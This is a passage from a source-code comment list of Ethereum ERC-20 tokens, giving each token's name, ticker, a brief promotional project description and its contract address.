// We envision QASH to be the preferred payment token for financial services, like the Bitcoin for financial services. As more financial institutions, fintech startups and partners adopt QASH as a method of payment, the utility of QASH will scale, fueling the Fintech revolution.
// 0x618e75ac90b12c6049ba3b27f5d5f8651b0037f6

// AIOZ Network (AIOZ)
// The AIOZ Network is a decentralized content delivery network, which relies on multiple nodes spread out throughout the globe. These nodes provide computational-demanding resources like bandwidth, storage, and computational power in order to store content, share content and perform computing tasks.
// 0x626e8036deb333b408be468f951bdb42433cbf18

// Bluzelle (BLZ)
// Aims to be the next-gen database protocol for the decentralized internet.
// 0x5732046a883704404f284ce41ffadd5b007fd668

// Reserve (RSV)
// Reserve aims to create a stable decentralized currency targeted at emerging economies.
// 0x196f4727526eA7FB1e17b2071B3d8eAA38486988

// Presearch (PRE)
// Presearch is building a decentralized search engine powered by the community. Presearch utilizes its PRE cryptocurrency token to reward users for searching and to power its Keyword Staking ad platform.
// 0xEC213F83defB583af3A000B1c0ada660b1902A0F

// TORN Token (TORN)
// Tornado Cash is a fully decentralized protocol for private transactions on Ethereum.
// 0x77777feddddffc19ff86db637967013e6c6a116c

// Student Coin (STC)
// The idea of the project is to create a worldwide academically-focused cryptocurrency, supervised by university and research faculty, established by students for students. Student Coins are used to build a multi-university ecosystem of value transfer.
// 0x15b543e986b8c34074dfc9901136d9355a537e7e

// Melon Token (MLN)
// Enzyme is a way to build, scale, and monetize investment strategies
// 0xec67005c4e498ec7f55e092bd1d35cbc47c91892

// HOPR Token (HOPR)
// HOPR provides essential and compliant network-level metadata privacy for everyone. HOPR is an open incentivized mixnet which enables privacy-preserving point-to-point data exchange.
// 0xf5581dfefd8fb0e4aec526be659cfab1f8c781da

// DIAToken (DIA)
// DIA is delivering verifiable financial data from traditional and crypto sources to its community.
// 0x84cA8bc7997272c7CfB4D0Cd3D55cd942B3c9419

// EverRise (RISE)
// EverRise is a blockchain technology company that offers bridging and security solutions across blockchains through an ecosystem of decentralized applications. The EverRise token (RISE) is a multi-chain, collateralized cryptocurrency that powers the EverRise dApp ecosystem.
// 0xC17c30e98541188614dF99239cABD40280810cA3

// Refereum (RFR)
// Distribution and growth platform for games.
// 0xd0929d411954c47438dc1d871dd6081f5c5e149c


// bZx Protocol Token (BZRX)
// BZRX token.
// 0x56d811088235F11C8920698a204A5010a788f4b3

// CoinDash Token (CDT)
// Blox is an open-source, fully non-custodial staking platform for Ethereum 2.0. Their goal at Blox is to simplify staking while ensuring Ethereum stays fair and decentralized.
// 0x177d39ac676ed1c67a2b268ad7f1e58826e5b0af

// Nectar (NCT)
// Decentralized marketplace where security experts build anti-malware engines that compete to protect you.
// 0x9e46a38f5daabe8683e10793b06749eef7d733d1

// Wirex Token (WXT)
// Wirex is a worldwide digital payment platform and regulated institution endeavoring to make digital money accessible to everyone. XT is a utility token and used as a backbone for Wirex's reward system called X-Tras
// 0xa02120696c7b8fe16c09c749e4598819b2b0e915

// FOX (FOX)
// FOX is ShapeShift’s official loyalty token. Holders of FOX enjoy zero-commission trading and win ongoing USDC crypto payments from Rainfall (payments increase in proportion to your FOX holdings). Use at ShapeShift.com.
// 0xc770eefad204b5180df6a14ee197d99d808ee52d

// Tellor Tributes (TRB)
// Tellor is a decentralized oracle that provides an on-chain data bank where staked miners compete to add the data points.
// 0x88df592f8eb5d7bd38bfef7deb0fbc02cf3778a0

// OVR (OVR)
// OVR ecosystem allow users to earn by buying, selling or renting OVR Lands or just by stacking OVR Tokens while content creators can earn building and publishing AR experiences.
// 0x21bfbda47a0b4b5b1248c767ee49f7caa9b23697

// Ampleforth Governance (FORTH)
// FORTH is the governance token for the Ampleforth protocol. AMPL is the first rebasing currency and a key DeFi building block for denominating stable contracts.
// 0x77fba179c79de5b7653f68b5039af940ada60ce0

// Moss Coin (MOC)
// Location-based Augmented Reality Mobile Game based on Real Estate
// 0x865ec58b06bf6305b886793aa20a2da31d034e68

// ICONOMI (ICN)
// ICONOMI Digital Assets Management platform enables simple access to a variety of digital assets and combined Digital Asset Arrays
// 0x888666CA69E0f178DED6D75b5726Cee99A87D698

// Kin (KIN)
// The vision for Kin is rooted in the belief that a participants can come together to create an open ecosystem of tools for digital communication and commerce that prioritizes consumer experience, fair and user-oriented model for digital services.
// 0x818fc6c2ec5986bc6e2cbf00939d90556ab12ce5

// 0xBitcoin Token (0xBTC)
// Pure mined digital currency for Ethereum
// 0xb6ed7644c69416d67b522e20bc294a9a9b405b31

// Ixs Token (IXS)
// IX Swap is the “Uniswap” for security tokens (STO) and tokenized stocks (TSO). IX Swap will be the FIRST platform to provide liquidity pools and automated market making functions for the security token (STO) & tokenized stock industry (TSO).
// 0x73d7c860998ca3c01ce8c808f5577d94d545d1b4

// Shopping.io (SPI)
// Shopping.io is a state of the art platform that unifies all major eCommerce platforms, allowing consumers to enjoy online shopping seamlessly, securely, and cost-effectively.
// 0x9b02dd390a603add5c07f9fd9175b7dabe8d63b7

// SunContract (SNC)
// The SunContract platform aims to empower individuals, with an emphasis on home owners, to freely buy, sell or trade electricity.
// 0xF4134146AF2d511Dd5EA8cDB1C4AC88C57D60404


// Curate (XCUR)
// Curate is a shopping rewards app for rewarding users with free cashback and crypto on all their purchases.
// 0xE1c7E30C42C24582888C758984f6e382096786bd


// CyberMiles (CMT)
// Empowering the Decentralization of Online Marketplaces.
// 0xf85feea2fdd81d51177f6b8f35f0e6734ce45f5f


// PAR Stablecoin (PAR)
// Mimo is a company building DeFi tools in the hope to make blockchain more usable to everyone. They have a lending platform allowing people to borrow PAR and their stable token is algorithmically pegged to the Euro.
// 0x68037790a0229e9ce6eaa8a99ea92964106c4703


// Moeda Loyalty Points (MDA)
// Moeda is a cooperative banking system powered by blockchain, built for everyone.
// 0x51db5ad35c671a87207d88fc11d593ac0c8415bd


// DivergenceProtocol (DIVER)
// A platform for on-chain composable crypto options.
// 0xfb782396c9b20e564a64896181c7ac8d8979d5f4


// Spheroid (SPH)
// Spheroid Universe is a MetaVerse for entertainment, games, advertising, and business in the world of Extended Reality. It operates geo-localized private property on Earth's digital surface (Spaces). The platform’s tech foundation is the Spheroid XR Cloud and the Spheroid Script programming language.
// 0xa0cf46eb152656c7090e769916eb44a138aaa406


// PIKA (PIKA)
// PikaCrypto is an ERC-20 meme token project.
// 0x60f5672a271c7e39e787427a18353ba59a4a3578
	

// Monolith (TKN)
// Non-custodial contract wallet paired with a debit card to spend your ETH & ERC-20 tokens in real life.
// 0xaaaf91d9b90df800df4f55c205fd6989c977e73a


// stakedETH (stETH)
// stakedETH (stETH) from StakeHound is a tokenized representation of ETH staked in Ethereum 2.0 mainnet which allows holders to earn Eth2 staking rewards while participating in the Ethereum DeFi ecosystem. Staking rewards are distributed directly into holders' wallets.
// 0xdfe66b14d37c77f4e9b180ceb433d1b164f0281d


// Salt (SALT)
// SALT lets you leverage your blockchain assets to secure cash loans. We make it easy to get money without having to sell your favorite investment.
// 0x4156D3342D5c385a87D264F90653733592000581


// Tidal Token (TIDAL)
// Tidal is an insurance platform enabling custom pools to cover DeFi protocols.
// 0x29cbd0510eec0327992cd6006e63f9fa8e7f33b7

// Tranche Finance (SLICE)
// Tranche is a decentralized protocol for managing risk. The protocol integrates with any interest accrual token, such as Compound's cTokens and AAVE's aTokens, to create two new interest-bearing instruments, one with a fixed-rate, Tranche A, and one with a variable rate, Tranche B.
// 0x0aee8703d34dd9ae107386d3eff22ae75dd616d1


// BTC 2x Flexible Leverage Index (BTC2x-FLI)
// The WBTC Flexible Leverage Index lets you leverage a collateralized debt position in a safe and efficient way, by abstracting its management into a simple index.
// 0x0b498ff89709d3838a063f1dfa463091f9801c2b


// InnovaMinex (MINX)
// Our ultimate goal is making gold and other precious metals more accessible to all the people through our cryptocurrency, InnovaMinex (MINX).
// 0xae353daeed8dcc7a9a12027f7e070c0a50b7b6a4

// UnmarshalToken (MARSH)
// Unmarshal is the multichain DeFi Data Network. It provides the easiest way to query Blockchain data from Ethereum, Binance Smart Chain, and Polkadot.
// 0x5a666c7d92e5fa7edcb6390e4efd6d0cdd69cf37


// VIB (VIB)
// Viberate is a crowdsourced live music ecosystem and a blockchain-based marketplace, where musicians are matched with booking agencies and event organizers.
// 0x2C974B2d0BA1716E644c1FC59982a89DDD2fF724


// WaBi (WaBi)
// Wabi ecosystem connects Brands and Consumers, enabling an exchange of value. Consumers get Wabi for engaging with Ecosystem and redeem the tokens at a Marketplace for thousands of products.
// 0x286BDA1413a2Df81731D4930ce2F862a35A609fE

// Pinknode Token (PNODE)
// Pinknode empowers developers by providing node-as-a-service solutions, removing an entire layer of inefficiencies and complexities, and accelerating product life cycle.
// 0xaf691508ba57d416f895e32a1616da1024e882d2


// Lambda (LAMB)
// Blockchain based decentralized storage solution
// 0x8971f9fd7196e5cee2c1032b50f656855af7dd26


// ABCC Token (AT)
// A cryptocurrency exchange.
// 0xbf8fb919a8bbf28e590852aef2d284494ebc0657

// UNIC (UNIC)
// Unicly is a permissionless, community-governed protocol to combine, fractionalize, and trade NFTs. Built by NFT collectors and DeFi enthusiasts, the protocol incentivizes NFT liquidity and provides a seamless trading experience for fractionalized NFTs.
// 0x94e0bab2f6ab1f19f4750e42d7349f2740513ad5


// SIRIN (SRN)
// SIRIN LABS’ aims to become the world’s leader in secure open source consumer electronics, bridging the gap between the mass market and the blockchain econom
// 0x68d57c9a1c35f63e2c83ee8e49a64e9d70528d25


// Shirtum (SHI)
// Shirtum is a global ecosystem of experiences designed for fans to dive into the history of sports and interact directly with their favorite athletes, clubs and sports brands.
// 0xad996a45fd2373ed0b10efa4a8ecb9de445a4302


// CREDITS (CS)
// CREDITS is an open blockchain platform with autonomous smart contracts and the internal cryptocurrency. The platform is designed to create services for blockchain systems using self-executing smart contracts and a public data registry.
// 0x46b9ad944d1059450da1163511069c718f699d31
	

// Wrapped ETHO (ETHO)
// Immutable, decentralized, highly redundant storage network. Wide ecosystem providing EVM compatibility, IPFS, and SDK to scale use cases and applications. Strong community and dedicated developer team with passion for utilizing revolutionary technology to support free speech and freedom of data.
// 0x0b5326da634f9270fb84481dd6f94d3dc2ca7096

// OpenANX (OAX)
// Decentralized Exchange.
// 0x701c244b988a513c945973defa05de933b23fe1d


// Woofy (WOOFY)
// Wuff wuff.
// 0xd0660cd418a64a1d44e9214ad8e459324d8157f1


// Jenny Metaverse DAO Token (uJENNY)
// Jenny is the first Metaverse DAO to be built on Unicly. It is building one of the most amazing 1-of-1, collectively owned NFT collections in the world.
// 0xa499648fd0e80fd911972bbeb069e4c20e68bf22

// NapoleonX (NPX)
// The crypto asset manager piloting trading bots.
// 0x28b5e12cce51f15594b0b91d5b5adaa70f684a02


// PoolTogether (POOL)
// PoolTogether is a protocol for no-loss prize games.
// 0x0cec1a9154ff802e7934fc916ed7ca50bde6844e


// UNCL (UNCL)
// UNCL is the liquidity and yield farmable token of the Unicrypt ecosystem.
// 0x2f4eb47A1b1F4488C71fc10e39a4aa56AF33Dd49


// Medical Token Currency (MTC)
// MTC is an utility token that fuels a healthcare platform providing healthcare information to interested parties on a secure blockchain supported environment.
// 0x905e337c6c8645263d3521205aa37bf4d034e745


// TenXPay (PAY)
// TenX connects your blockchain assets for everyday use. TenX’s debit card and banking licence will allow us to be a hub for the blockchain ecosystem to connect for real-world use cases.
// 0xB97048628DB6B661D4C2aA833e95Dbe1A905B280


// Tierion Network Token (TNT)
// Tierion creates software to reduce the cost and complexity of trust. Anchoring data to the blockchain and generating a timestamp proof.
// 0x08f5a9235b08173b7569f83645d2c7fb55e8ccd8


// DOVU (DOV)
// DOVU, partially owned by Jaguar Land Rover, is a tokenized data economy for DeFi carbon offsetting.
// 0xac3211a5025414af2866ff09c23fc18bc97e79b1


// RipioCreditNetwork (RCN)
// Ripio Credit Network is a global credit network based on cosigned smart contracts and blockchain technology that connects lenders and borrowers located anywhere in the world and on any currency
// 0xf970b8e36e23f7fc3fd752eea86f8be8d83375a6


// UseChain Token (USE)
// Mirror Identity Protocol and integrated with multi-level innovations in technology and structure design.
// 0xd9485499499d66b175cf5ed54c0a19f1a6bcb61a


// TaTaTu (TTU)
// Social Entertainment Platform with an integrated rewards programme.
// 0x9cda8a60dd5afa156c95bd974428d91a0812e054


// GoBlank Token (BLANK)
// BlockWallet is a privacy-focused non-custodial crypto wallet. Besides full privacy functionality, BlockWallet comes packed with an array of features that go beyond privacy for a seamless user experience. Reclaim your financial privacy. Get BlockWallet.
	// 0x41a3dba3d677e573636ba691a70ff2d606c29666

// Rapids (RPD)
// Fast and secure payments across social media via blockchain technology
// 0x4bf4f2ea258bf5cb69e9dc0ddb4a7a46a7c10c53


// VeriSafe (VSF)
// VeriSafe aims to be the catalyst for projects, exchanges and communities to collaborate, creating an ecosystem where transparency, accountability, communication, and expertise go hand-in-hand to set a standard in the industry.
// 0xac9ce326e95f51b5005e9fe1dd8085a01f18450c


// TOP Network (TOP)
// TOP Network is a decentralized open communication network that provides cloud communication services on the blockchain.
// 0xdcd85914b8ae28c1e62f1c488e1d968d5aaffe2b
	

// Virtue Player Points (VPP)
// Virtue Poker is a decentralized platform that uses the Ethereum blockchain and P2P networking to provide safe and secure online poker. Virtue Poker also launched Virtue Gaming: a free-to-play play-to-earn platform that is combined with Virtue Poker creating the first legal global player pool.
// 0x5eeaa2dcb23056f4e8654a349e57ebe5e76b5e6e
	

// Edgeless (EDG)
// The Ethereum smart contract-based that offers a 0% house edge and solves the transparency question once and for all.
// 0x08711d3b02c8758f2fb3ab4e80228418a7f8e39c


// Blockchain Certified Data Token (BCDT)
// The Blockchain Certified Data Token is the fuel of the EvidenZ ecosystem, a blockchain-powered certification technology.
// 0xacfa209fb73bf3dd5bbfb1101b9bc999c49062a5


// Airbloc (ABL)
// AIRBLOC is a decentralized personal data protocol where individuals would be able to monetize their data, and advertisers would be able to buy these data to conduct targeted marketing campaigns for higher ROIs.
// 0xf8b358b3397a8ea5464f8cc753645d42e14b79ea

// DAEX Token (DAX)
// DAEX is an open and decentralized clearing and settlement ecosystem for all cryptocurrency exchanges.
// 0x0b4bdc478791897274652dc15ef5c135cae61e60

// Armor (ARMOR)
// Armor is a smart insurance aggregator for DeFi, built on trustless and decentralized financial infrastructure.
// 0x1337def16f9b486faed0293eb623dc8395dfe46a
	

// Spendcoin (SPND)
// Spendcoin powers the Spend.com ecosystem. The Spend Wallet App & Spend Card give our users a multi-currency digital wallet that they can manage or spend from
// 0xddd460bbd9f79847ea08681563e8a9696867210c
	

// Float Protocol: FLOAT (FLOAT)
// FLOAT is a token that is designed to act as a floating stable currency in the protocol.
// 0xb05097849bca421a3f51b249ba6cca4af4b97cb9


// Public Mint (MINT)
// Public Mint offers a fiat-native blockchain platform open for anyone to build fiat-native applications and accept credit cards, ACH, stablecoins, wire transfers and more.
// 0x0cdf9acd87e940837ff21bb40c9fd55f68bba059


// Internxt (INXT)
// Internxt is working on building a private Internet. Internxt Drive is a decentralized cloud storage service available for individuals and businesses.
// 0x4a8f5f96d5436e43112c2fbc6a9f70da9e4e16d4


// Vader (VADER)
// Swap, LP, borrow, lend, mint interest-bearing synths, and more, in a fairly distributed, governance-minimal protocol built to last.
// 0x2602278ee1882889b946eb11dc0e810075650983


// Launchpool token (LPOOL)
// Launchpool believes investment funds and communities work side by side on projects, on the same terms, towards the same goals. Launchpool aims to harness their strengths and aligns their incentives, the sum is greater than its constituent parts.
// 0x6149c26cd2f7b5ccdb32029af817123f6e37df5b


// Unido (UDO)
// Unido is a technology ecosystem that addresses the governance, security and accessibility challenges of decentralized applications - enabling enterprises to manage crypto assets and capitalize on DeFi.
// 0xea3983fc6d0fbbc41fb6f6091f68f3e08894dc06


// YOU Chain (YOU)
// YOUChain will create a public infrastructure chain that all people can participate, produce personal virtual items and trade personal virtual items on their own.
// 0x34364BEe11607b1963d66BCA665FDE93fCA666a8


// RUFF (RUFF)
// Decentralized open source blockchain architecture for high efficiency Internet of Things application development
// 0xf278c1ca969095ffddded020290cf8b5c424ace2



// OddzToken (ODDZ)
// Oddz Protocol is an On-Chain Option trading platform that expedites the execution of options contracts, conditional trades, and futures. It allows the creation, maintenance, execution, and settlement of trustless options, conditional tokens, and futures in a fast, secure, and flexible manner.
// 0xcd2828fc4d8e8a0ede91bb38cf64b1a81de65bf6


// DIGITAL FITNESS (DEFIT)
// Digital Fitness is a groundbreaking decentralised fitness platform powered by its native token DEFIT connecting people with Health and Fitness professionals worldwide. Pioneer in gamification of the Fitness industry with loyalty rewards and challenges for competing and staying fit and healthy.
// 0x84cffa78b2fbbeec8c37391d2b12a04d2030845e


// UCOT (UCT)
// Ubique Chain Of Things (UCT) is utility token and operates on its own platform which combines IOT and blockchain technologies in supply chain industries.
// 0x3c4bEa627039F0B7e7d21E34bB9C9FE962977518

// VIN (VIN)
// Complete vehicle data all in one marketplace - making automotive more secure, transparent and accessible by all
// 0xf3e014fe81267870624132ef3a646b8e83853a96

// Aurora (AOA)
// Aurora Chain offers intelligent application isolation and enables multi-chain parallel expansion to create an extremely high TPS with security maintain.
// 0x9ab165d795019b6d8b3e971dda91071421305e5a


// Egretia (EGT)
// HTML5 Blockchain Engine and Platform
// 0x8e1b448ec7adfc7fa35fc2e885678bd323176e34


// Standard (STND)
// Standard Protocol is a Collateralized Rebasable Stablecoins (CRS) protocol for synthetic assets that will operate in the Polkadot ecosystem
// 0x9040e237c3bf18347bb00957dc22167d0f2b999d


// TrueFlip (TFL)
// Blockchain games with instant payouts and open source code,
// 0xa7f976c360ebbed4465c2855684d1aae5271efa9


// Strips Token (STRP)
// Strips makes it easy for traders and investors to trade interest rates using a derivatives instrument called a perpetual interest rate swap (perpetual IRS). Strips is a decentralised interest rate derivatives exchange built on the Ethereum layer 2 Arbitrum.
// 0x97872eafd79940c7b24f7bcc1eadb1457347adc9


// Decentr (DEC)
// Decentr is a publicly accessible, open-source blockchain protocol that targets the consumer crypto loans market, securing user data, and returning data value to the user.
// 0x30f271C9E86D2B7d00a6376Cd96A1cFBD5F0b9b3


// Jigstack (STAK)
// Jigstack is an Ethereum-based DAO with a conglomerate structure. Its purpose is to govern a range of high-quality DeFi products. Additionally, the infrastructure encompasses a single revenue and governance feed, orchestrated via the native $STAK token.
// 0x1f8a626883d7724dbd59ef51cbd4bf1cf2016d13


// CoinUs (CNUS)
// CoinUs is a integrated business platform with focus on individual's value and experience to provide Human-to-Blockchain Interface.
// 0x722f2f3eac7e9597c73a593f7cf3de33fbfc3308


// qiibeeToken (QBX)
// The global standard for loyalty on the blockchain. With qiibee, businesses around the world can run their loyalty programs on the blockchain.
// 0x2467aa6b5a2351416fd4c3def8462d841feeecec


// Digix Gold Token (DGX)
// Gold Backed Tokens
// 0x4f3afec4e5a3f2a6a1a411def7d7dfe50ee057bf


// aXpire (AXPR)
// The aXpire project is comprised of a number of business-to-business (B2B) software platforms as well as business-to-consumer (B2C) applications. As its mission, aXpire is focused on software for businesses that helps them automate outdated tasks, increasing efficiency, and profitability.
// 0xdD0020B1D5Ba47A54E2EB16800D73Beb6546f91A


// SpaceChain (SPC)
// SpaceChain is a community-based space platform that combines space and blockchain technologies to build the world’s first open-source blockchain-based satellite network.
// 0x8069080a922834460c3a092fb2c1510224dc066b


// COS (COS)
// One-stop shop for all things crypto: an exchange, an e-wallet which supports a broad variety of tokens, a platform for ICO launches and promotional trading campaigns, a fiat gateway, a market cap widget, and more
// 0x7d3cb11f8c13730c24d01826d8f2005f0e1b348f


// Arcona Distribution Contract (ARCONA)
// Arcona - X Reality Metaverse aims to bring together the virtual and real worlds. The Arcona X Reality environment generate new forms of reality by bringing digital objects into the physical world and bringing physical world objects into the digital world
// 0x0f71b8de197a1c84d31de0f1fa7926c365f052b3

// Posscoin (POSS)
// Posscoin is an innovative payment network and a new kind of money.
// 0x6b193e107a773967bd821bcf8218f3548cfa2503

// Internet Node Token (INT)
// IOT applications
// 0x0b76544f6c413a555f309bf76260d1e02377c02a

// PayPie (PPP)
// PayPie platform brings ultimate trust and transparency to the financial markets by introducing the world’s first risk score algorithm based on business accounting.
// 0xc42209aCcC14029c1012fB5680D95fBd6036E2a0

// Impermax (IMX)
// Impermax is a DeFi ecosystem that enables liquidity providers to leverage their LP tokens.
// 0x7b35ce522cb72e4077baeb96cb923a5529764a00

// 1-UP (1-UP)
// 1up is an NFT powered, 2D gaming platform that aims to decentralize battle-royale style tournaments for the average gamer, allowing them to earn.
// 0xc86817249634ac209bc73fca1712bbd75e37407d

// Centra (CTR)
// Centra PrePaid Cryptocurrency Card
// 0x96A65609a7B84E8842732DEB08f56C3E21aC6f8a

// NFT INDEX (NFTI)
// The NFT Index is a digital asset index designed to track tokens’ performance within the NFT industry. The index is weighted based on the value of each token’s circulating supply.
// 0xe5feeac09d36b18b3fa757e5cf3f8da6b8e27f4c

// Own (CHX)
// Own (formerly Chainium) is a security token blockchain project focused on revolutionising equity markets.
// 0x1460a58096d80a50a2f1f956dda497611fa4f165


// Cindicator (CND)
// Hybrid Intelligence for effective asset management.
// 0xd4c435f5b09f855c3317c8524cb1f586e42795fa


// ASIA COIN (ASIA)
// Asia Coin(ASIA) is the native token of Asia Exchange and aiming to be widely used in Asian markets among diamond-Gold and crypto dealers. AsiaX is now offering crypto trading combined with 260,000+ loose diamonds stock.
// 0xf519381791c03dd7666c142d4e49fd94d3536011
	

// 1World (1WO)
// 1World is first of its kind media token and new generation Adsense. 1WO is used for increasing user engagement by sharing 10% ads revenue with participants and for buying ads.
// 0xfdbc1adc26f0f8f8606a5d63b7d3a3cd21c22b23

// Insights Network (INSTAR)
// The Insights Network’s unique combination of blockchain technology, smart contracts, and secure multiparty computation enables the individual to securely own, manage, and monetize their data.
// 0xc72fe8e3dd5bef0f9f31f259399f301272ef2a2d
	

// Cryptonovae (YAE)
// Cryptonovae is an all-in-one multi-exchange trading ecosystem to manage digital assets across centralized and decentralized exchanges. It aims to provide a sophisticated trading experience through advanced charting features and trade management.
// 0x4ee438be38f8682abb089f2bfea48851c5e71eaf

// CPChain (CPC)
// CPChain is a new distributed infrastructure for next generation Internet of Things (IoT).
// 0xfAE4Ee59CDd86e3Be9e8b90b53AA866327D7c090


// ZAP TOKEN (ZAP)
// Zap project is a suite of tools for creating smart contract oracles and a marketplace to find and subscribe to existing data feeds that have been oraclized
// 0x6781a0f84c7e9e846dcb84a9a5bd49333067b104


// Genaro X (GNX)
// The Genaro Network is the first Turing-complete public blockchain combining peer-to-peer storage with a sustainable consensus mechanism. Genaro's mixed consensus uses SPoR and PoS, ensuring stronger performance and security.
// 0x6ec8a24cabdc339a06a172f8223ea557055adaa5

// PILLAR (PLR)
// A cryptocurrency and token wallet that aims to become the dashboard for its users' digital life.
// 0xe3818504c1b32bf1557b16c238b2e01fd3149c17


// Falcon (FNT)
// Falcon Project it's a DeFi ecosystem which includes two completely interchangeable blockchains - ERC-20 token on the Ethereum and private Falcon blockchain. Falcon Project offers its users the right to choose what suits them best at the moment: speed and convenience or anonymity and privacy.
// 0xdc5864ede28bd4405aa04d93e05a0531797d9d59


// MATRIX AI Network (MAN)
// Aims to be an open source public intelligent blockchain platform
// 0xe25bcec5d3801ce3a794079bf94adf1b8ccd802d


// Genesis Vision (GVT)
// A platform for the private trust management market, built on Blockchain technology and Smart Contracts.
// 0x103c3A209da59d3E7C4A89307e66521e081CFDF0

// CarLive Chain (IOV)
// CarLive Chain is a vertical application of blockchain technology in the field of vehicle networking. It provides services to 1.3 billion vehicle users worldwide and the trillion-dollar-scale automobile consumer market.
// 0x0e69d0a2bbb30abcb7e5cfea0e4fde19c00a8d47


// Pawthereum (PAWTH)
// Pawthereum is a cryptocurrency project with animal welfare charitable fundamentals at its core. It aims to give back to animal shelters and be a digital advocate for animals in need.
// 0xaecc217a749c2405b5ebc9857a16d58bdc1c367f


// Furucombo (COMBO)
// Furucombo is a tool built for end-users to optimize their DeFi strategy simply by drag and drop. It visualizes complex DeFi protocols into cubes. Users setup inputs/outputs and the order of the cubes (a “combo”), then Furucombo bundles all the cubes into one transaction and sends them out.
// 0xffffffff2ba8f66d4e51811c5190992176930278


// Xaurum (Xaurum)
// Xaurum is unit of value on the golden blockchain, it represents an increasing amount of gold and can be exchanged for it by melting
// 0x4DF812F6064def1e5e029f1ca858777CC98D2D81
	

// Plasma (PPAY)
// PPAY is designed as the all-in-one defi service token combining access, rewards, staking and governance functions.
	// 0x054D64b73d3D8A21Af3D764eFd76bCaA774f3Bb2

// Digg (DIGG)
// Digg is an elastic bitcoin-pegged token and governed by BadgerDAO.
// 0x798d1be841a82a273720ce31c822c61a67a601c3


// OriginSport Token (ORS)
// A blockchain based sports betting platform
// 0xeb9a4b185816c354db92db09cc3b50be60b901b6


// WePower (WPR)
// Blockchain Green energy trading platform
// 0x4CF488387F035FF08c371515562CBa712f9015d4


// Monetha (MTH)
// Trusted ecommerce.
// 0xaf4dce16da2877f8c9e00544c93b62ac40631f16


// BitSpawn Token (SPWN)
// Bitspawn is a gaming blockchain protocol aiming to give gamers new revenue streams.
// 0xe516d78d784c77d479977be58905b3f2b1111126

// NEXT (NEXT)
// A hybrid exchange registered as an N. V. (Public company) in the Netherlands and provides fiat pairs to all altcoins on its platform
// 0x377d552914e7a104bc22b4f3b6268ddc69615be7

// UREEQA Token (URQA)
// UREEQA is a platform for Protecting, Managing and Monetizing creative work.
// 0x1735db6ab5baa19ea55d0adceed7bcdc008b3136


// Eden Coin (EDN)
// EdenChain is a blockchain platform that allows for the capitalization of any and every tangible and intangible asset such as stocks, bonds, real estate, and commodities amongst many others.
// 0x89020f0D5C5AF4f3407Eb5Fe185416c457B0e93e
	

// PieDAO DOUGH v2 (DOUGH)
// DOUGH is the PieDAO governance token. Owning DOUGH makes you a member of PieDAO. Holders are capable of participating in the DAO’s governance votes and proposing votes of their own.
// 0xad32A8e6220741182940c5aBF610bDE99E737b2D
	

// cVToken (cV)
// Decentralized car history registry built on blockchain.
// 0x50bC2Ecc0bfDf5666640048038C1ABA7B7525683


// CrowdWizToken (WIZ)
// Democratize the investing process by eliminating intermediaries and placing the power and control where it belongs - entirely into the hands of investors.
// 0x2f9b6779c37df5707249eeb3734bbfc94763fbe2


// Aluna (ALN)
// Aluna.Social is a gamified social trading terminal able to manage multiple exchange accounts, featuring a transparent social environment to learn from experts and even mirror trades. Aluna's vision is to gamify finance and create the ultimate social trading experience for a Web 3.0 world.
// 0x8185bc4757572da2a610f887561c32298f1a5748


// Gas DAO (GAS)
// Gas DAO’s purpose is simple: to be the heartbeat and voice of the Ethereum network’s active users through on and off-chain governance, launched as a decentralized autonomous organization with a free and fair initial distribution 100x bigger than the original DAO.
// 0x6bba316c48b49bd1eac44573c5c871ff02958469
	

// Hiveterminal Token (HVN)
// A blockchain based platform providing you fast and low-cost liquidity.
// 0xC0Eb85285d83217CD7c891702bcbC0FC401E2D9D


// EXRP Network (EXRN)
// Connecting the blockchains using crosschain gateway built with smart contracts.
// 0xe469c4473af82217b30cf17b10bcdb6c8c796e75

// Neumark (NEU)
// Neufund’s Equity Token Offerings (ETOs) open the possibility to fundraise on Blockchain, with legal and technical framework done for you.
// 0xa823e6722006afe99e91c30ff5295052fe6b8e32


// Bloom (BLT)
// Decentralized credit scoring powered by Ethereum and IPFS.
// 0x107c4504cd79c5d2696ea0030a8dd4e92601b82e


// IONChain Token (IONC)
// Through IONChain Protocol, IONChain will serve as the link between IoT devices, supporting decentralized peer-to-peer application interaction between devices.
// 0xbc647aad10114b89564c0a7aabe542bd0cf2c5af


// Voice Token (VOICE)
// Voice is the governance token of Mute.io that makes cryptocurrency and DeFi trading more accessible to the masses.
// 0x2e2364966267B5D7D2cE6CD9A9B5bD19d9C7C6A9


// Snetwork (SNET)
// Distributed Shared Cloud Computing Network
// 0xff19138b039d938db46bdda0067dc4ba132ec71c


// AMLT (AMLT)
// The Coinfirm AMLT token solves AML/CTF needs for cryptocurrency and blockchain-related companies and allows for the safe adoption of cryptocurrencies and blockchain by players in the traditional economy.
// 0xca0e7269600d353f70b14ad118a49575455c0f2f


// LibraToken (LBA)
// Decentralized lending infrastructure facilitating open access to credit networks on Ethereum.
// 0xfe5f141bf94fe84bc28ded0ab966c16b17490657


// GAT (GAT)
// GATCOIN aims to transform traditional discount coupons, loyalty points and shopping vouchers into liquid, tradable digital tokens.
// 0x687174f8c49ceb7729d925c3a961507ea4ac7b28


// Tadpole (TAD)
// Tadpole Finance is an open-source platform providing decentralized finance services for saving and lending. Tadpole Finance is an experimental project to create a more open lending market, where users can make deposits and loans with any ERC20 tokens on the Ethereum network.
// 0x9f7229aF0c4b9740e207Ea283b9094983f78ba04


// Hacken (HKN)
// Global Tokenized Business with Operating Cybersecurity Products.
// 0x9e6b2b11542f2bc52f3029077ace37e8fd838d7f


// DeFiner (FIN)
// DeFiner is a non-custodial digital asset platform with a true peer-to-peer network for savings, lending, and borrowing all powered by blockchain technology.
// 0x054f76beED60AB6dBEb23502178C52d6C5dEbE40
	

// XIO Network (XIO)
// Blockzero is a decentralized autonomous accelerator that helps blockchain projects reach escape velocity. Users can help build, scale, and own the next generation of decentralized projects at blockzerolabs.io.
// 0x0f7F961648aE6Db43C75663aC7E5414Eb79b5704


// Autonio (NIOX)
// Autonio Foundation is a DAO that develops decentralized and comprehensive financial technology for the crypto economy to make it easier for crypto traders to conduct trading analysis, deploy trading algorithms, copy successful traders and exchange cryptocurrencies.
// 0xc813EA5e3b48BEbeedb796ab42A30C5599b01740


// Hydro Protocol (HOT)
// A network transport layer protocol for hybrid decentralized exchanges.
// 0x9af839687f6c94542ac5ece2e317daae355493a1


// Humaniq (HMQ)
// Humaniq aims to be a simple and secure 4th generation mobile bank.
// 0xcbcc0f036ed4788f63fc0fee32873d6a7487b908


// Signata (SATA)
// The Signata project aims to deliver a full suite of blockchain-powered identity and access control solutions, including hardware token integration and a marketplace of smart contracts for integration with 3rd party service providers.
